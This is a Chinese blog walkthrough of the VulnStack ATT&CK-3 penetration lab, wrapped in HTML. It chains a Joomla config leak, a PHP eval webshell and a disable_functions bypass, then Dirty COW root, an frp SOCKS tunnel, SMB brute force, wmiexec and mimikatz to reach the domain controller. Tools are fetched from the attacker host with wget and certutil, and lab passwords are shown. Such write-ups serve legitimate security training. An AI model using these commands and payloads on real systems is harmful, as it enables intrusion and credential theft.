@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="VulnStack-ATT&amp;CK-3"><meta name="keywords" content=""><meta name="author" content="山野人"><meta name="copyright" content="山野人"><title>VulnStack-ATT&amp;CK-3 | 山野人</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '7.1.1'
+} </script><meta name="generator" content="Hexo 7.1.1"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">服务器渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text">信息泄露利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetShell"><span class="toc-number">1.2.</span> <span class="toc-text">GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E7%A0%81%E5%AD%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">写入码子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">蚁剑连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E9%99%90%E5%88%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">插件绕过函数限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.4.</span> <span class="toc-text">SSH连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Frp%E4%BB%A3%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">Frp代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%88%B0CentOS"><span class="toc-number">2.2.2.</span> <span class="toc-text">上传到CentOS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9Proxychains%E9%85%8D%E7%BD%AE"><span class="toc-number">2.2.3.</span> <span class="toc-text">修改Proxychains配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="toc-number">2.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.4.</span> <span class="toc-text">SMB密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wmiexec%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.5.</span> <span class="toc-text">Wmiexec连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87"><span class="toc-number">2.6.</span> <span class="toc-text">Mimikatz抓取密码明文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Flag"><span class="toc-number">2.7.</span> <span class="toc-text">获取Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">下载链接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-number">4.1.</span> <span class="toc-text">frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">4.2.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec"><span class="toc-number">4.3.</span> <span class="toc-text">wmiexec</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">山野人</div><div class="author-info__description text-center">日落山水静 为君起松声</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">9</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">山野人</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">VulnStack-ATT&amp;CK-3</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-09-21</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="服务器渗透"><a href="#服务器渗透" class="headerlink" title="服务器渗透"></a>服务器渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -n -v 192.168.3.0/24 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921002120668.png" alt="image-20240921002120668"></p>
+<p>发现192.168.3.4</p>
+<h4 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h4><p><img src="/pic/image-20240921002501672.png" alt="image-20240921002501672"></p>
+<p>发现是joomla，查一下发现有一个能GetShell的洞，但是需要用管理员登录才能用，试了一下密码爆破，没啥用，没什么思路扫一下目录爽爽</p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.3.4 -e php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921005339748.png" alt="image-20240921005339748"></p>
+<p>发现配置文件，访问看看，注意直接访问.php是没有显示的，需要访问.php~</p>
+<p><img src="/pic/image-20240921005455972.png" alt="image-20240921005455972"></p>
+<h4 id="信息泄露利用"><a href="#信息泄露利用" class="headerlink" title="信息泄露利用"></a>信息泄露利用</h4><p>发现mysql用户名和密码，端口扫描的时候发现3306端口是对外开放的，那用navicat连接一下改掉管理员密码就行了</p>
+<p><img src="/pic/image-20240921005749517.png" alt="image-20240921005749517"></p>
+<p><img src="/pic/image-20240921005808709.png" alt="image-20240921005808709"></p>
+<p>经过加密了，加密算法不知道，想直接破解很难，好在官方文档给了一个示例<a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">如何恢复或重置管理员密码？ - Joomla! Documentation</a>，直接将密码改为“d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199”也就是“secret”加密后的值，修改后直接使用administrator&#x2F;secret登录</p>
+<p><img src="/pic/image-20240921010101646.png" alt="image-20240921010101646"></p>
+<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在前台登录后点了半天没发现什么，搜了一下发现是后台getshell，结合前面的目录扫描，后台地址是administrator&#x2F;index.php</p>
+<p><img src="/pic/image-20240921010456131.png" alt="image-20240921010456131"></p>
+<p>登陆后选择Extentions&gt;&gt;Templates&gt;&gt;Templates&gt;&gt;Beez3 Details and Files</p>
+<p><img src="/pic/image-20240921010914121.png" alt="image-20240921010914121"></p>
+<p><img src="/pic/image-20240921011026455.png" alt="image-20240921011026455"></p>
+<p>新建一个1.php</p>
+<p><img src="/pic/image-20240921011119609.png" alt="image-20240921011119609"></p>
+<img src="/pic/image-20240921011209915.png" alt="image-20240921011209915" style="zoom:67%;" />
+
+
+
+<h4 id="写入码子"><a href="#写入码子" class="headerlink" title="写入码子"></a>写入码子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.4/templates/beez3/1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921011938134.png" alt="image-20240921011938134"></p>
+<p>连接成功，但是每个命令都是返回ret&#x3D;127，应该是禁用了函数，使用插件进行绕过</p>
+<h4 id="插件绕过函数限制"><a href="#插件绕过函数限制" class="headerlink" title="插件绕过函数限制"></a>插件绕过函数限制</h4><p>使用disable_functions进行绕过</p>
+<p><img src="/pic/image-20240921012053723.png" alt="image-20240921012053723"></p>
+<p>选择LD_PRELOAD模式，改一下地址，然后开始</p>
+<p><img src="/pic/image-20240921012152993.png" alt="image-20240921012152993"></p>
+<p><img src="/pic/image-20240921012236133.png" alt="image-20240921012236133"></p>
+<p>然后将地址改到.antproxy.php就行，连接密码不变</p>
+<p><img src="/pic/image-20240921012325999.png" alt="image-20240921012325999"></p>
+<p><img src="/pic/image-20240921012356408.png" alt="image-20240921012356408"></p>
+<p>发现一个神奇的东西，我们现在连接的是192.168.3.4(CentOS)，为什么ifconfig出来的网卡是192.168.93.120(Ubuntu)，我们的192.168.3.4(CentOS)莫名消失，原来是192.168.3.4(CentOS)做了nginx反向代理，这使得在蚁剑的shell是192.168.93.120(Ubuntu)主机的shell，而蚁剑中所见的文件也是192.168.93.120(Ubuntu)主机的文件</p>
+<p>思路断了，翻一下文件，发现&#x2F;tmp&#x2F;mysql&#x2F;test.txt里面有用户名密码wwwuser&#x2F;wwwuser_123Aqx，尝试使用ssh来连接一下，发现连接成功（好扯，莫名其妙）</p>
+<h4 id="SSH连接"><a href="#SSH连接" class="headerlink" title="SSH连接"></a>SSH连接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh wwwuser@192.168.3.4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921013220299.png" alt="image-20240921013220299"></p>
+<p>如果连接报错no matching host key type found. Their offer: ssh-rsa,ssh-dss，可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa wwwuser@192.168.3.4</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>很明显不是root，为了方便后续渗透，先提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921013625564.png" alt="image-20240921013625564"></p>
+<p>kali中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 2.6.32</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921013928348.png" alt="image-20240921013928348"></p>
+<p>发现有脏牛的，我挑40839.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 40839.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921014459628.png" alt="image-20240921014459628"></p>
+<p>开启HTTP服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921014523617.png" alt="image-20240921014523617"></p>
+<p>在192.168.3.4(CentOS)下载40839.c</p>
+<p><img src="/pic/image-20240921014821294.png" alt="image-20240921014821294"></p>
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+
+<p>赋予权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 dirty</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirty 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921015101604.png" alt="image-20240921015101604"></p>
+<p>提示删除&#x2F;tmp&#x2F;passwd.bak</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /tmp/passwd.bak</span><br></pre></td></tr></table></figure>
+
+<p>执行，这个要等一会儿</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirty 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921015337916.png" alt="image-20240921015337916"></p>
+<p>切换到firefart&#x2F;123456用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921015501399.png" alt="image-20240921015501399"></p>
+<p>成功得到root权限，看看网络信息</p>
+<p><img src="/pic/image-20240921015634063.png" alt="image-20240921015634063"></p>
+<p>两个网卡，一个是我们已知的，另一个是内网IP，猜测该计算机在某内网中</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>在192.168.3.4(CentOS)中运行下面命令（可能运行比较慢）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for k in $(seq 1 200); do ping -c 1 192.168.93.$k | grep &quot;ttl&quot; | awk -F&#x27;[ :]+&#x27; &#x27;&#123;print $4&#125;&#x27;; done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921020625064.png" alt="image-20240921020625064"></p>
+<p>根据现有的信息，可以判断.100是192.168.3.4(CentOS)，.120是ubuntu，如果需要进一步渗透，我们最好先建立隧道代理</p>
+<h3 id="Frp代理"><a href="#Frp代理" class="headerlink" title="Frp代理"></a>Frp代理</h3><p>这里使用的是frp0.58.1</p>
+<h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>frps.toml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 7001</span><br></pre></td></tr></table></figure>
+
+<p>frpc.toml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;kaliIP&quot;</span><br><span class="line">serverPort = 7001</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;socks5&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 6005</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="上传到CentOS"><a href="#上传到CentOS" class="headerlink" title="上传到CentOS"></a>上传到CentOS</h4><p>kali的frp目录下执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921104627067.png" alt="image-20240921104627067"></p>
+<p>CentOS执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.3.3:8080/frpc</span><br><span class="line">wget http://192.168.3.3:8080/frpc.toml</span><br><span class="line">chmod 777 frps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921104658770.png" alt="image-20240921104658770"></p>
+<p>kali中执行，先停掉http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921104718104.png" alt="image-20240921104718104"></p>
+<p>CentOS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921104739377.png" alt="image-20240921104739377"></p>
+<h4 id="修改Proxychains配置"><a href="#修改Proxychains配置" class="headerlink" title="修改Proxychains配置"></a>修改Proxychains配置</h4><p>kali中的新终端执行，别把frp关掉，在末尾添加如图的socks5配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921104942934.png" alt="image-20240921104942934"></p>
+<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sV -n -v -Pn 192.168.93.10</span><br><span class="line">proxychains4 nmap -sV -n -v -Pn 192.168.93.20</span><br><span class="line">proxychains4 nmap -sV -n -v -Pn 192.168.93.30</span><br></pre></td></tr></table></figure>
+
+<p>发现445都开着，尝试smb爆破</p>
+<h3 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a>SMB密码爆破</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">search smb_login</span><br><span class="line">use 0</span><br><span class="line">set RHOSTS 192.168.93.30</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE ~/dic/pass.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921110714515.png" alt="image-20240921110714515"></p>
+<p>成功得到93.30的smb账号密码</p>
+<h3 id="Wmiexec连接"><a href="#Wmiexec连接" class="headerlink" title="Wmiexec连接"></a>Wmiexec连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec-pro.py &#x27;administrator:123qwe!ASD@192.168.93.30&#x27; exec-command -shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921110858704.png" alt="image-20240921110858704"></p>
+<h3 id="Mimikatz抓取密码明文"><a href="#Mimikatz抓取密码明文" class="headerlink" title="Mimikatz抓取密码明文"></a>Mimikatz抓取密码明文</h3><p>上传mimikatz到93.30，此时我们无法直接让kali开启HTTP服务，93.30下载，因为93.30在内网网段，kali不在内网，所以我们在CentOS中开启HTTP服务来给WIN下载，所以思路是kali&gt;&gt;CentOS&gt;&gt;WIN</p>
+<p>操作基本和前面的python开HTTP然后下载类似，不过要注意CentOS需要这样子开HTTP服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>
+
+<p>这里我们就跳过kali&gt;&gt;CentOS，直接来看WIN中如何下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.93.100:8080/mimikatz.exe C:\1.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921111703740.png" alt="image-20240921111703740"></p>
+<p>下载成功，下面利用，注意需要相同路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.exe log privilege::debug sekurlsa::logonpasswords</span><br><span class="line">type mimikatz.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921111853712.png" alt="image-20240921111853712"></p>
+<p>得到域控的密码，直接ping一下找到哪个是域控DC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping test.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921111959829.png" alt="image-20240921111959829"></p>
+<p>使用Administrator&#x2F;zxcASDqw123!!登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec-pro.py &#x27;Administrator:zxcASDqw123!!@192.168.93.10&#x27; exec-command -shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921112121808.png" alt="image-20240921112121808"></p>
+<h3 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ../../Users/Administrator/Documents</span><br><span class="line">type flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921112426993.png" alt="image-20240921112426993"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有的地方感觉有点刻意，比如一开始SSH连接把账号密码放在test.txt中，以及SMB密码爆破，如果字典里刚好没有这个密码就很难受了，不过应该也有其他方法做，现在一刷不知道，以后学到了再来。</p>
+<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp</span><br></pre></td></tr></table></figure>
+
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ParrotSec/mimikatz</span><br></pre></td></tr></table></figure>
+
+<h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/XiaoliChan/wmiexec-Pro</span><br></pre></td></tr></table></figure></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">山野人</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://lxy00.top/2024/09/21/VulnStack-ATT&amp;CK-3/">http://lxy00.top/2024/09/21/VulnStack-ATT&amp;CK-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lxy00.top">山野人</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2024/09/21/VulnStack-ATT&amp;CK-4/"><i class="fa fa-chevron-left">  </i><span>VulnStack-ATT&amp;CK-4</span></a></div><div class="next-post pull-right"><a href="/2024/04/16/iwebsec_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span>iwebsec_反序列化漏洞</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
+var verify = 'false' == 'true';
+var record_ip = 'false' == 'true';
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  recordIP:record_ip,
+  appId:'Bnr1wLZ3jY69sAXABKBTt5TO-gzGzoHsz',
+  appKey:'loLNR3sesNkuhCMjtzlb2g1d',
+  placeholder:'请你不要 diss 我',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2022 - 2024 By 山野人</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://github.com/Yllxx03">Github</a>!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script 